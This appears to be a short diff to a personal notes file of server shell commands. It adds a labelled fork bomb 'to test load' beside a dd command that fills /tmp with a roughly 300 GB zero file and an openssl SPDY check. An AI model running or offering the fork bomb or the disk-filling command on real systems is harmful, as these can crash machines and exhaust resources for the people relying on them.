@@ -1,6 +1,9 @@
 #Increase disk space:
 dd if=/dev/zero of=/tmp/tempFiller.deleteMe bs=1M count=300000
 
+#Fork bomb to test load
+:(){ :|: & };:
+
 #To check if spdy is running execute this on the server
 openssl s_client -connect localhost:443 -nextprotoneg ''
 
